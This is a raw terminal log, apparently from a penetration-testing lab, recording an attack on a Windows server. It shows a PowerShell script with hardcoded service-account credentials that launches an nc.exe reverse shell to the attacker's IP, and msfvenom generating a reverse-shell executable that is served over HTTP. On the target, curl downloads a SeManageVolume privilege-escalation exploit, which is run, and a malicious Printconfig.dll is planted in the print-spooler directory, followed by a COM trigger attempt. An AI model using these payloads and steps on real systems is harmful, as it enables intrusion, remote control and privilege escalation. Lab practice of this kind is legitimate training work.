@@ -1,0 +1,513 @@
+┌──([1m[32msk4t4㉿ThinkPadKali[0m)-[[1m~/PG/Access/Loot[0m]
+└─[1m[34m$[0m
+┌──([1m[32msk4t4㉿ThinkPadKali[0m)-[[1m~/PG/Access/Loot[0m]
+└─[1m[34m$[0m cd ../Temp/
+┌──([1m[32msk4t4㉿ThinkPadKali[0m)-[[1m~/PG/Access/Temp[0m]
+└─[1m[34m$[0m
+┌──([1m[32msk4t4㉿ThinkPadKali[0m)-[[1m~/PG/Access/Temp[0m]
+└─[1m[34m$[0m vim nc_runas
+┌──([1m[32msk4t4㉿ThinkPadKali[0m)-[[1m~/PG/Access/Temp[0m]
+└─[1m[34m$[0m
+┌──([1m[32msk4t4㉿ThinkPadKali[0m)-[[1m~/PG/Access/Temp[0m]
+└─[1m[34m$[0m cat nc_runas
+$username = 'svc_mssql'
+$password = 'trustno1'
+$securePassword = ConvertTo-SecureString $password -AsPlainText -Force
+$credential = New-Object System.Management.Automation.PSCredential $username, $securePassword
+Start-Process -FilePath C:\xampp\htdocs\uploads\nc.exe -NoNewWindow -Credential $credential -ArgumentList ("-nc","192.168.45.190","9000","-e","cmd.exe") -WorkingDirectory C:\Users\Public
+┌──([1m[32msk4t4㉿ThinkPadKali[0m)-[[1m~/PG/Access/Temp[0m]
+└─[1m[34m$[0m rlwrap nc -lvp 9000
+Listening on 0.0.0.0 9000
+┌──([1m[32msk4t4㉿ThinkPadKali[0m)-[[1m~/PG/Access/Temp[0m]
+└─[1m[34m$[0m msfvenom -p windows/x64/shell_reverse_tcp LHOST=tun0 LPORT=9000 -f exe -o privesc.exe
+[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
+[-] No arch selected, selecting arch: x64 from the payload
+No encoder specified, outputting raw payload
+Payload size: 460 bytes
+Final size of exe file: 7680 bytes
+Saved as: privesc.exe
+┌──([1m[32msk4t4㉿ThinkPadKali[0m)-[[1m~/PG/Access/Temp[0m]
+└─[1m[34m$[0m http
+Traceback (most recent call last):
+  File [35m"<frozen runpy>"[39m, line [35m198[39m, in [35m_run_module_as_main[39m
+  File [35m"<frozen runpy>"[39m, line [35m88[39m, in [35m_run_code[39m
+  File [35m"/usr/lib/python3.13/http/server.py"[39m, line [35m1345[39m, in [35m<module>[39m
+    [31mtest[1m([0m
+    [31m~~~~[1m^[0m
+        [1m[31mHandlerClass=handler_class,[0m
+        [1m[31m^^^^^^^^^^^^^^^^^^^^^^^^^^^[0m
+    ...<3 lines>...
+        [1m[31mprotocol=args.protocol,[0m
+        [1m[31m^^^^^^^^^^^^^^^^^^^^^^^[0m
+    [1m[31m)[0m
+    [1m[31m^[0m
+  File [35m"/usr/lib/python3.13/http/server.py"[39m, line [35m1292[39m, in [35mtest[39m
+    with [31mServerClass[1m(addr, HandlerClass)[0m as httpd:
+         [31m~~~~~~~~~~~[1m^^^^^^^^^^^^^^^^^^^^[0m
+  File [35m"/usr/lib/python3.13/socketserver.py"[39m, line [35m457[39m, in [35m__init__[39m
+    [31mself.server_bind[1m()[0m
+    [31m~~~~~~~~~~~~~~~~[1m^^[0m
+  File [35m"/usr/lib/python3.13/http/server.py"[39m, line [35m1339[39m, in [35mserver_bind[39m
+    return [31msuper().server_bind[1m()[0m
+           [31m~~~~~~~~~~~~~~~~~~~[1m^^[0m
+  File [35m"/usr/lib/python3.13/http/server.py"[39m, line [35m140[39m, in [35mserver_bind[39m
+    [31msocketserver.TCPServer.server_bind[1m(self)[0m
+    [31m~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~[1m^^^^^^[0m
+  File [35m"/usr/lib/python3.13/socketserver.py"[39m, line [35m478[39m, in [35mserver_bind[39m
+    [31mself.socket.bind[1m(self.server_address)[0m
+    [31m~~~~~~~~~~~~~~~~[1m^^^^^^^^^^^^^^^^^^^^^[0m
+[1m[35mOSError[0m: [35m[Errno 98] Address already in use[39m
+┌──([1m[32msk4t4㉿ThinkPadKali[0m)-[[1m~/PG/Access/Temp[0m]
+└─[1m[34m$[0m http
+Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
+192.168.176.187 - - [17/Jun/2026 11:07:39] "GET /privesc.exe HTTP/1.1" 200 -
+192.168.176.187 - - [17/Jun/2026 11:07:47] "GET /privesc.exe HTTP/1.1" 200 -
+^C
+Keyboard interrupt received, exiting.
+┌──([1m[32msk4t4㉿ThinkPadKali[0m)-[[1m~/PG/Access/Temp[0m]
+└─[1m[34m$[0m
+┌──([1m[32msk4t4㉿ThinkPadKali[0m)-[[1m~/PG/Access/Temp[0m]
+└─[1m[34m$[0m rlwrap nc -lvp 9000
+Listening on 0.0.0.0 9000
+Connection received on 192.168.176.187 65027
+┌──([1m[32msk4t4㉿ThinkPadKali[0m)-[[1m~/PG/Access/Temp[0m]
+└─[1m[34m$[0m rlwrap nc -lvp 9000
+Listening on 0.0.0.0 9000
+Connection received on 192.168.176.187 65068
+Microsoft Windows [Version 10.0.17763.2746]
+(c) 2018 Microsoft Corporation. All rights reserved.
+C:\Windows\system32>whoami /priv
+whoami /priv
+PRIVILEGES INFORMATION
+----------------------
+Privilege Name                Description                      State
+============================= ================================ ========
+SeMachineAccountPrivilege     Add workstations to domain       Disabled
+SeChangeNotifyPrivilege       Bypass traverse checking         Enabled
+SeManageVolumePrivilege       Perform volume maintenance tasks Disabled
+SeIncreaseWorkingSetPrivilege Increase a process working set   Disabled
+C:\Windows\system32>cd C:\xampp
+cd C:\xampp
+C:\xampp>dir
+dir
+ Volume in drive C has no label.
+ Volume Serial Number is 5C30-DCD7
+ Directory of C:\xampp
+04/08/2022  02:36 AM    <DIR>          .
+04/08/2022  02:36 AM    <DIR>          ..
+04/08/2022  02:31 AM    <DIR>          apache
+06/07/2013  11:15 AM               436 apache_start.bat
+10/01/2019  07:13 AM               190 apache_stop.bat
+04/05/2021  04:16 PM            10,324 catalina_service.bat
+04/05/2021  04:17 PM             3,766 catalina_start.bat
+04/05/2021  04:17 PM             3,529 catalina_stop.bat
+04/08/2022  02:31 AM    <DIR>          cgi-bin
+04/08/2022  02:31 AM    <DIR>          contrib
+04/08/2022  02:31 AM    <DIR>          FileZillaFTP
+04/08/2022  02:30 AM    <DIR>          htdocs
+04/08/2022  02:31 AM    <DIR>          install
+04/08/2022  02:31 AM    <DIR>          licenses
+04/08/2022  02:31 AM    <DIR>          locale
+04/08/2022  02:31 AM    <DIR>          MercuryMail
+04/08/2022  02:32 AM    <DIR>          mysql
+06/03/2019  11:39 AM               471 mysql_start.bat
+10/01/2019  07:13 AM               270 mysql_stop.bat
+03/13/2017  11:04 AM               824 passwords.txt
+04/08/2022  02:32 AM    <DIR>          perl
+04/08/2022  02:32 AM    <DIR>          php
+04/08/2022  02:32 AM    <DIR>          phpMyAdmin
+06/08/2021  06:51 AM             7,651 readme_de.txt
+06/08/2021  06:51 AM             7,513 readme_en.txt
+04/08/2022  02:32 AM    <DIR>          sendmail
+11/12/2015  05:13 PM               370 setup_xampp.bat
+11/29/2020  02:38 PM             1,671 test_php.bat
+06/17/2026  10:37 AM    <DIR>          tmp
+04/08/2022  02:32 AM    <DIR>          tomcat
+04/08/2022  02:32 AM    <DIR>          webalizer
+04/08/2022  02:32 AM    <DIR>          webdav
+04/06/2021  11:38 AM         3,368,448 xampp-control.exe
+04/05/2021  04:08 PM               978 xampp-control.ini
+03/30/2013  12:29 PM           118,784 xampp_start.exe
+03/30/2013  12:29 PM           118,784 xampp_stop.exe
+              16 File(s)      3,644,009 bytes
+              20 Dir(s)  10,602,967,040 bytes free
+C:\xampp>icacls .\
+icacls .\
+.\ ACCESS\svc_apache:(OI)(CI)(F)
+   NT AUTHORITY\SYSTEM:(I)(OI)(CI)(F)
+   BUILTIN\Administrators:(I)(OI)(CI)(F)
+   BUILTIN\Users:(I)(OI)(CI)(RX)
+   BUILTIN\Users:(I)(CI)(AD)
+   BUILTIN\Users:(I)(CI)(WD)
+   CREATOR OWNER:(I)(OI)(CI)(IO)(F)
+Successfully processed 1 files; Failed processing 0 files
+C:\xampp>Get-CimInstance -ClassName win32_service | Select Name,State,PathName | Where-Object {$_.State -like 'Running'}|findstr xampp
+Get-CimInstance -ClassName win32_service | Select Name,State,PathName | Where-Object {$_.State -like 'Running'}|findstr xampp
+'Get-CimInstance' is not recognized as an internal or external command,
+operable program or batch file.
+C:\xampp>powershell
+powershell
+Windows PowerShell
+Copyright (C) Microsoft Corporation. All rights reserved.
+PS C:\xampp> Get-CimInstance -ClassName win32_service | Select Name,State,PathName | Where-Object {$_.State -like 'Running'}|findstr xampp
+Get-CimInstance -ClassName win32_service | Select Name,State,PathName | Where-Object {$_.State -like 'Running'}|findstr xampp
+PS C:\xampp> Get-CimInstance -ClassName win32_service | Select Name,State,PathName | Where-Object {$_.State -like 'Running'}
+Get-CimInstance -ClassName win32_service | Select Name,State,PathName | Where-Object {$_.State -like 'Running'}
+Name                   State   PathName
+----                   -----   --------
+ADWS                   Running C:\Windows\ADWS\Microsoft.ActiveDirectory.WebServices.exe
+ApacheHTTPServer       Running "C:\Xampp\apache\bin\httpd.exe" -k runservice
+BFE                    Running C:\Windows\system32\svchost.exe -k LocalServiceNoNetworkFirewall -p
+BrokerInfrastructure   Running C:\Windows\system32\svchost.exe -k DcomLaunch -p
+CDPSvc                 Running C:\Windows\system32\svchost.exe -k LocalService -p
+COMSysApp              Running C:\Windows\system32\dllhost.exe /Processid:{02D4B3F1-FD88-11D1-960D-00805FC79235}
+CoreMessagingRegistrar Running C:\Windows\system32\svchost.exe -k LocalServiceNoNetwork -p
+CryptSvc               Running C:\Windows\system32\svchost.exe -k NetworkService -p
+DcomLaunch             Running C:\Windows\system32\svchost.exe -k DcomLaunch -p
+Dfs                    Running C:\Windows\system32\dfssvc.exe
+DFSR                   Running C:\Windows\system32\DFSRs.exe
+Dhcp                   Running C:\Windows\system32\svchost.exe -k LocalServiceNetworkRestricted -p
+DiagTrack              Running C:\Windows\System32\svchost.exe -k utcsvc -p
+DNS                    Running C:\Windows\system32\dns.exe
+Dnscache               Running C:\Windows\system32\svchost.exe -k NetworkService -p
+DPS                    Running C:\Windows\System32\svchost.exe -k LocalServiceNoNetwork -p
+DsSvc                  Running C:\Windows\System32\svchost.exe -k LocalSystemNetworkRestricted -p
+EventLog               Running C:\Windows\System32\svchost.exe -k LocalServiceNetworkRestricted -p
+EventSystem            Running C:\Windows\system32\svchost.exe -k LocalService -p
+FontCache              Running C:\Windows\system32\svchost.exe -k LocalService -p
+gpsvc                  Running C:\Windows\system32\svchost.exe -k netsvcs -p
+IKEEXT                 Running C:\Windows\system32\svchost.exe -k netsvcs -p
+iphlpsvc               Running C:\Windows\System32\svchost.exe -k NetSvcs -p
+IsmServ                Running C:\Windows\System32\ismserv.exe
+Kdc                    Running C:\Windows\System32\lsass.exe
+KeyIso                 Running C:\Windows\system32\lsass.exe
+LanmanServer           Running C:\Windows\System32\svchost.exe -k smbsvcs
+LanmanWorkstation      Running C:\Windows\System32\svchost.exe -k NetworkService -p
+LicenseManager         Running C:\Windows\System32\svchost.exe -k LocalService -p
+lmhosts                Running C:\Windows\System32\svchost.exe -k LocalServiceNetworkRestricted -p
+LSM                    Running
+mpssvc                 Running C:\Windows\system32\svchost.exe -k LocalServiceNoNetworkFirewall -p
+MSDTC                  Running C:\Windows\System32\msdtc.exe
+NcbService             Running C:\Windows\System32\svchost.exe -k LocalSystemNetworkRestricted -p
+Netlogon               Running C:\Windows\system32\lsass.exe
+Netman                 Running C:\Windows\System32\svchost.exe -k LocalSystemNetworkRestricted -p
+netprofm               Running C:\Windows\System32\svchost.exe -k LocalService -p
+NlaSvc                 Running C:\Windows\System32\svchost.exe -k NetworkService -p
+nsi                    Running C:\Windows\system32\svchost.exe -k LocalService -p
+PcaSvc                 Running C:\Windows\system32\svchost.exe -k LocalSystemNetworkRestricted -p
+PlugPlay               Running C:\Windows\system32\svchost.exe -k DcomLaunch -p
+PolicyAgent            Running C:\Windows\system32\svchost.exe -k NetworkServiceNetworkRestricted -p
+Power                  Running C:\Windows\system32\svchost.exe -k DcomLaunch -p
+ProfSvc                Running C:\Windows\system32\svchost.exe -k netsvcs -p
+RpcEptMapper           Running C:\Windows\system32\svchost.exe -k RPCSS -p
+RpcSs                  Running C:\Windows\system32\svchost.exe -k rpcss -p
+SamSs                  Running C:\Windows\system32\lsass.exe
+Schedule               Running C:\Windows\system32\svchost.exe -k netsvcs -p
+seclogon               Running C:\Windows\system32\svchost.exe -k netsvcs -p
+SecurityHealthService  Running C:\Windows\system32\SecurityHealthService.exe
+SENS                   Running C:\Windows\system32\svchost.exe -k netsvcs -p
+ShellHWDetection       Running C:\Windows\System32\svchost.exe -k netsvcs -p
+Spooler                Running C:\Windows\System32\spoolsv.exe
+SysMain                Running C:\Windows\system32\svchost.exe -k LocalSystemNetworkRestricted -p
+SystemEventsBroker     Running C:\Windows\system32\svchost.exe -k DcomLaunch -p
+Themes                 Running C:\Windows\System32\svchost.exe -k netsvcs -p
+TimeBrokerSvc          Running C:\Windows\system32\svchost.exe -k LocalServiceNetworkRestricted -p
+UALSVC                 Running C:\Windows\system32\svchost.exe -k LocalSystemNetworkRestricted -p
+UserManager            Running C:\Windows\system32\svchost.exe -k netsvcs -p
+UsoSvc                 Running C:\Windows\system32\svchost.exe -k netsvcs -p
+vds                    Running C:\Windows\System32\vds.exe
+VGAuthService          Running "C:\Program Files\VMware\VMware Tools\VMware VGAuth\VGAuthService.exe"
+VM3DService            Running C:\Windows\system32\vm3dservice.exe
+VMTools                Running "C:\Program Files\VMware\VMware Tools\vmtoolsd.exe"
+W32Time                Running C:\Windows\system32\svchost.exe -k LocalService
+Wcmsvc                 Running C:\Windows\system32\svchost.exe -k LocalServiceNetworkRestricted -p
+WdiServiceHost         Running C:\Windows\System32\svchost.exe -k LocalService -p
+WdiSystemHost          Running C:\Windows\System32\svchost.exe -k LocalSystemNetworkRestricted -p
+WerSvc                 Running C:\Windows\System32\svchost.exe -k WerSvcGroup
+WinDefend              Running "C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.26050.15-0\MsMpEng.exe"
+WinHttpAutoProxySvc    Running C:\Windows\system32\svchost.exe -k LocalServiceNetworkRestricted -p
+Winmgmt                Running C:\Windows\system32\svchost.exe -k netsvcs -p
+WinRM                  Running C:\Windows\System32\svchost.exe -k NetworkService -p
+WpnService             Running C:\Windows\system32\svchost.exe -k netsvcs -p
+MDCoreSvc              Running "C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.26050.15-0\MpDefenderCoreSer...
+PS C:\xampp> del apache\bin\httpd.exe
+del apache\bin\httpd.exe
+del : Cannot remove item C:\xampp\apache\bin\httpd.exe: Access to the path 'C:\xampp\apache\bin\httpd.exe' is denied.
+At line:1 char:1
++ del apache\bin\httpd.exe
++ ~~~~~~~~~~~~~~~~~~~~~~~~
+    + CategoryInfo          : PermissionDenied: (C:\xampp\apache\bin\httpd.exe:FileInfo) [Remove-Item], UnauthorizedAc
+   cessException
+    + FullyQualifiedErrorId : RemoveFileSystemItemUnAuthorizedAccess,Microsoft.PowerShell.Commands.RemoveItemCommand
+PS C:\xampp> move apache\bin\httpd.exe .\
+move apache\bin\httpd.exe .\
+move : Access to the path is denied.
+At line:1 char:1
++ move apache\bin\httpd.exe .\
++ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+    + CategoryInfo          : PermissionDenied: (C:\xampp\apache\bin\httpd.exe:FileInfo) [Move-Item], UnauthorizedAcce
+   ssException
+    + FullyQualifiedErrorId : MoveFileInfoItemUnauthorizedAccessError,Microsoft.PowerShell.Commands.MoveItemCommand
+PS C:\xampp> move apache\bin\httpd.exe apache\bin\http.exe_bak
+move apache\bin\httpd.exe apache\bin\http.exe_bak
+move : Access to the path is denied.
+At line:1 char:1
++ move apache\bin\httpd.exe apache\bin\http.exe_bak
++ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+    + CategoryInfo          : PermissionDenied: (C:\xampp\apache\bin\httpd.exe:FileInfo) [Move-Item], UnauthorizedAcce
+   ssException
+    + FullyQualifiedErrorId : MoveFileInfoItemUnauthorizedAccessError,Microsoft.PowerShell.Commands.MoveItemCommand
+PS C:\xampp> icacls apache\bin\*
+icacls apache\bin\*
+apache\bin\ab.exe ACCESS\svc_apache:(I)(F)
+                  NT AUTHORITY\SYSTEM:(I)(F)
+                  BUILTIN\Administrators:(I)(F)
+                  BUILTIN\Users:(I)(RX)
+apache\bin\abs.exe ACCESS\svc_apache:(I)(F)
+                   NT AUTHORITY\SYSTEM:(I)(F)
+                   BUILTIN\Administrators:(I)(F)
+                   BUILTIN\Users:(I)(RX)
+apache\bin\ApacheMonitor.exe ACCESS\svc_apache:(I)(F)
+                             NT AUTHORITY\SYSTEM:(I)(F)
+                             BUILTIN\Administrators:(I)(F)
+                             BUILTIN\Users:(I)(RX)
+apache\bin\apr_crypto_openssl-1.dll ACCESS\svc_apache:(I)(F)
+                                    NT AUTHORITY\SYSTEM:(I)(F)
+                                    BUILTIN\Administrators:(I)(F)
+                                    BUILTIN\Users:(I)(RX)
+apache\bin\apr_dbd_odbc-1.dll ACCESS\svc_apache:(I)(F)
+                              NT AUTHORITY\SYSTEM:(I)(F)
+                              BUILTIN\Administrators:(I)(F)
+                              BUILTIN\Users:(I)(RX)
+apache\bin\apr_ldap-1.dll ACCESS\svc_apache:(I)(F)
+                          NT AUTHORITY\SYSTEM:(I)(F)
+                          BUILTIN\Administrators:(I)(F)
+                          BUILTIN\Users:(I)(RX)
+apache\bin\curl-ca-bundle.crt ACCESS\svc_apache:(I)(F)
+                              NT AUTHORITY\SYSTEM:(I)(F)
+                              BUILTIN\Administrators:(I)(F)
+                              BUILTIN\Users:(I)(RX)
+apache\bin\curl.exe ACCESS\svc_apache:(I)(F)
+                    NT AUTHORITY\SYSTEM:(I)(F)
+                    BUILTIN\Administrators:(I)(F)
+                    BUILTIN\Users:(I)(RX)
+apache\bin\dbmmanage.pl ACCESS\svc_apache:(I)(F)
+                        NT AUTHORITY\SYSTEM:(I)(F)
+                        BUILTIN\Administrators:(I)(F)
+                        BUILTIN\Users:(I)(RX)
+apache\bin\htcacheclean.exe ACCESS\svc_apache:(I)(F)
+                            NT AUTHORITY\SYSTEM:(I)(F)
+                            BUILTIN\Administrators:(I)(F)
+                            BUILTIN\Users:(I)(RX)
+apache\bin\htdbm.exe ACCESS\svc_apache:(I)(F)
+                     NT AUTHORITY\SYSTEM:(I)(F)
+                     BUILTIN\Administrators:(I)(F)
+                     BUILTIN\Users:(I)(RX)
+apache\bin\htdigest.exe ACCESS\svc_apache:(I)(F)
+                        NT AUTHORITY\SYSTEM:(I)(F)
+                        BUILTIN\Administrators:(I)(F)
+                        BUILTIN\Users:(I)(RX)
+apache\bin\htpasswd.exe ACCESS\svc_apache:(I)(F)
+                        NT AUTHORITY\SYSTEM:(I)(F)
+                        BUILTIN\Administrators:(I)(F)
+                        BUILTIN\Users:(I)(RX)
+apache\bin\httpd.exe ACCESS\svc_apache:(I)(F)
+                     NT AUTHORITY\SYSTEM:(I)(F)
+                     BUILTIN\Administrators:(I)(F)
+                     BUILTIN\Users:(I)(RX)
+apache\bin\httxt2dbm.exe ACCESS\svc_apache:(I)(F)
+                         NT AUTHORITY\SYSTEM:(I)(F)
+                         BUILTIN\Administrators:(I)(F)
+                         BUILTIN\Users:(I)(RX)
+apache\bin\iconv ACCESS\svc_apache:(OI)(CI)(F)
+                 ACCESS\svc_apache:(I)(OI)(CI)(F)
+                 NT AUTHORITY\SYSTEM:(I)(OI)(CI)(F)
+                 BUILTIN\Administrators:(I)(OI)(CI)(F)
+                 BUILTIN\Users:(I)(OI)(CI)(RX)
+                 BUILTIN\Users:(I)(CI)(AD)
+                 BUILTIN\Users:(I)(CI)(WD)
+                 CREATOR OWNER:(I)(OI)(CI)(IO)(F)
+apache\bin\icudt68.dll ACCESS\svc_apache:(I)(F)
+                       NT AUTHORITY\SYSTEM:(I)(F)
+                       BUILTIN\Administrators:(I)(F)
+                       BUILTIN\Users:(I)(RX)
+apache\bin\icuin68.dll ACCESS\svc_apache:(I)(F)
+                       NT AUTHORITY\SYSTEM:(I)(F)
+                       BUILTIN\Administrators:(I)(F)
+                       BUILTIN\Users:(I)(RX)
+apache\bin\icuio68.dll ACCESS\svc_apache:(I)(F)
+                       NT AUTHORITY\SYSTEM:(I)(F)
+                       BUILTIN\Administrators:(I)(F)
+                       BUILTIN\Users:(I)(RX)
+apache\bin\icuuc68.dll ACCESS\svc_apache:(I)(F)
+                       NT AUTHORITY\SYSTEM:(I)(F)
+                       BUILTIN\Administrators:(I)(F)
+                       BUILTIN\Users:(I)(RX)
+apache\bin\jansson.dll ACCESS\svc_apache:(I)(F)
+                       NT AUTHORITY\SYSTEM:(I)(F)
+                       BUILTIN\Administrators:(I)(F)
+                       BUILTIN\Users:(I)(RX)
+apache\bin\libapr-1.dll ACCESS\svc_apache:(I)(F)
+                        NT AUTHORITY\SYSTEM:(I)(F)
+                        BUILTIN\Administrators:(I)(F)
+                        BUILTIN\Users:(I)(RX)
+apache\bin\libapriconv-1.dll ACCESS\svc_apache:(I)(F)
+                             NT AUTHORITY\SYSTEM:(I)(F)
+                             BUILTIN\Administrators:(I)(F)
+                             BUILTIN\Users:(I)(RX)
+apache\bin\libaprutil-1.dll ACCESS\svc_apache:(I)(F)
+                            NT AUTHORITY\SYSTEM:(I)(F)
+                            BUILTIN\Administrators:(I)(F)
+                            BUILTIN\Users:(I)(RX)
+apache\bin\libcrypto-1_1-x64.dll ACCESS\svc_apache:(I)(F)
+                                 NT AUTHORITY\SYSTEM:(I)(F)
+                                 BUILTIN\Administrators:(I)(F)
+                                 BUILTIN\Users:(I)(RX)
+apache\bin\libcurl.dll ACCESS\svc_apache:(I)(F)
+                       NT AUTHORITY\SYSTEM:(I)(F)
+                       BUILTIN\Administrators:(I)(F)
+                       BUILTIN\Users:(I)(RX)
+apache\bin\libhttpd.dll ACCESS\svc_apache:(I)(F)
+                        NT AUTHORITY\SYSTEM:(I)(F)
+                        BUILTIN\Administrators:(I)(F)
+                        BUILTIN\Users:(I)(RX)
+apache\bin\libsasl.dll ACCESS\svc_apache:(I)(F)
+                       NT AUTHORITY\SYSTEM:(I)(F)
+                       BUILTIN\Administrators:(I)(F)
+                       BUILTIN\Users:(I)(RX)
+apache\bin\libssh2.dll ACCESS\svc_apache:(I)(F)
+                       NT AUTHORITY\SYSTEM:(I)(F)
+                       BUILTIN\Administrators:(I)(F)
+                       BUILTIN\Users:(I)(RX)
+apache\bin\libssl-1_1-x64.dll ACCESS\svc_apache:(I)(F)
+                              NT AUTHORITY\SYSTEM:(I)(F)
+                              BUILTIN\Administrators:(I)(F)
+                              BUILTIN\Users:(I)(RX)
+apache\bin\libxml2.dll ACCESS\svc_apache:(I)(F)
+                       NT AUTHORITY\SYSTEM:(I)(F)
+                       BUILTIN\Administrators:(I)(F)
+                       BUILTIN\Users:(I)(RX)
+apache\bin\logresolve.exe ACCESS\svc_apache:(I)(F)
+                          NT AUTHORITY\SYSTEM:(I)(F)
+                          BUILTIN\Administrators:(I)(F)
+                          BUILTIN\Users:(I)(RX)
+apache\bin\lua52.dll ACCESS\svc_apache:(I)(F)
+                     NT AUTHORITY\SYSTEM:(I)(F)
+                     BUILTIN\Administrators:(I)(F)
+                     BUILTIN\Users:(I)(RX)
+apache\bin\nghttp2.dll ACCESS\svc_apache:(I)(F)
+                       NT AUTHORITY\SYSTEM:(I)(F)
+                       BUILTIN\Administrators:(I)(F)
+                       BUILTIN\Users:(I)(RX)
+apache\bin\openssl.exe ACCESS\svc_apache:(I)(F)
+                       NT AUTHORITY\SYSTEM:(I)(F)
+                       BUILTIN\Administrators:(I)(F)
+                       BUILTIN\Users:(I)(RX)
+apache\bin\pcre.dll ACCESS\svc_apache:(I)(F)
+                    NT AUTHORITY\SYSTEM:(I)(F)
+                    BUILTIN\Administrators:(I)(F)
+                    BUILTIN\Users:(I)(RX)
+apache\bin\pv.exe ACCESS\svc_apache:(I)(F)
+                  NT AUTHORITY\SYSTEM:(I)(F)
+                  BUILTIN\Administrators:(I)(F)
+                  BUILTIN\Users:(I)(RX)
+apache\bin\rotatelogs.exe ACCESS\svc_apache:(I)(F)
+                          NT AUTHORITY\SYSTEM:(I)(F)
+                          BUILTIN\Administrators:(I)(F)
+                          BUILTIN\Users:(I)(RX)
+apache\bin\wintty.exe ACCESS\svc_apache:(I)(F)
+                      NT AUTHORITY\SYSTEM:(I)(F)
+                      BUILTIN\Administrators:(I)(F)
+                      BUILTIN\Users:(I)(RX)
+apache\bin\zlib1.dll ACCESS\svc_apache:(I)(F)
+                     NT AUTHORITY\SYSTEM:(I)(F)
+                     BUILTIN\Administrators:(I)(F)
+                     BUILTIN\Users:(I)(RX)
+Successfully processed 40 files; Failed processing 0 files
+PS C:\xampp>
+PS C:\xampp> restart-computer
+restart-computer
+restart-computer : Failed to restart the computer SERVER with the following error message: Privilege not held. .
+At line:1 char:1
++ restart-computer
++ ~~~~~~~~~~~~~~~~
+    + CategoryInfo          : OperationStopped: (SERVER:String) [Restart-Computer], InvalidOperationException
+    + FullyQualifiedErrorId : RestartcomputerFailed,Microsoft.PowerShell.Commands.RestartComputerCommand
+PS C:\xampp> whoami /priv
+whoami /priv
+PRIVILEGES INFORMATION
+----------------------
+Privilege Name                Description                      State
+============================= ================================ ========
+SeMachineAccountPrivilege     Add workstations to domain       Disabled
+SeChangeNotifyPrivilege       Bypass traverse checking         Enabled
+SeManageVolumePrivilege       Perform volume maintenance tasks Disabled
+SeIncreaseWorkingSetPrivilege Increase a process working set   Disabled
+PS C:\xampp>
+┌──([1m[32msk4t4㉿ThinkPadKali[0m)-[[1m~/PG/Access/Temp[0m]
+└─[1m[34m$[0m
+┌──([1m[32msk4t4㉿ThinkPadKali[0m)-[[1m~/PG/Access/Temp[0m]
+└─[1m[34m$[0m rlwrap nc -lvp 9000
+Listening on 0.0.0.0 9000
+Connection received on 192.168.176.187 65181
+Microsoft Windows [Version 10.0.17763.2746]
+(c) 2018 Microsoft Corporation. All rights reserved.
+C:\Windows\system32>cd C:\Users\Public
+cd C:\Users\Public
+C:\Users\Public>dir
+dir
+ Volume in drive C has no label.
+ Volume Serial Number is 5C30-DCD7
+ Directory of C:\Users\Public
+05/28/2021  03:53 AM    <DIR>          .
+05/28/2021  03:53 AM    <DIR>          ..
+05/28/2021  10:47 AM    <DIR>          Documents
+09/15/2018  12:19 AM    <DIR>          Downloads
+09/15/2018  12:19 AM    <DIR>          Music
+09/15/2018  12:19 AM    <DIR>          Pictures
+09/15/2018  12:19 AM    <DIR>          Videos
+               0 File(s)              0 bytes
+               7 Dir(s)  10,601,660,416 bytes free
+C:\Users\Public>curl 192.168.45.190/SeManageVolumeExploit.exe -o exploit.exe
+curl 192.168.45.190/SeManageVolumeExploit.exe -o exploit.exe
+  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
+                                 Dload  Upload   Total   Spent    Left  Speed
+100 12288  100 12288    0     0  49256      0 --:--:-- --:--:-- --:--:-- 49349
+C:\Users\Public>whoami /priv
+whoami /priv
+PRIVILEGES INFORMATION
+----------------------
+Privilege Name                Description                      State
+============================= ================================ ========
+SeMachineAccountPrivilege     Add workstations to domain       Disabled
+SeChangeNotifyPrivilege       Bypass traverse checking         Enabled
+SeManageVolumePrivilege       Perform volume maintenance tasks Disabled
+SeIncreaseWorkingSetPrivilege Increase a process working set   Disabled
+C:\Users\Public>.\exploit.exe
+.\exploit.exe
+Entries changed: 943
+DONE
+C:\Users\Public>curl 192.168.45.190/Printconfig.dll -o C:\Windows\System32\spool\drivers\x64\3\Printconfig.dll
+curl 192.168.45.190/Printconfig.dll -o C:\Windows\System32\spool\drivers\x64\3\Printconfig.dll
+  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
+                                 Dload  Upload   Total   Spent    Left  Speed
+100  9216  100  9216    0     0  54833      0 --:--:-- --:--:-- --:--:-- 54857
+C:\Users\Public>powershell -ep bypass
+powershell -ep bypass
+Windows PowerShell
+Copyright (C) Microsoft Corporation. All rights reserved.
+PS C:\Users\Public> $type = [Type]::GetTypeFromCLSID("{854A20FB-2D44-457D-992F-EF13785D2B51}")
+$object = [Activator]::CreateInstance($type)
+$type = [Type]::GetTypeFromCLSID("{854A20FB-2D44-457D-992F-EF13785D2B51}")
+PS C:\Users\Public> $object = [Activator]::CreateInstance($type)
+Exception calling "CreateInstance" with "1" argument(s): "Retrieving the COM class factory for component with CLSID
+{854A20FB-2D44-457D-992F-EF13785D2B51} failed due to the following error: 80080005 Server execution failed (Exception
+from HRESULT: 0x80080005 (CO_E_SERVER_EXEC_FAILURE))."
+At line:1 char:1
++ $object = [Activator]::CreateInstance($type)
++ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+    + CategoryInfo          : NotSpecified: (:) [], MethodInvocationException
+    + FullyQualifiedErrorId : COMException
+PS C:\Users\Public>
+┌──([1m[32msk4t4㉿ThinkPadKali[0m)-[[1m~/PG/Access/Temp[0m]
+└─[1m[34m$[0m
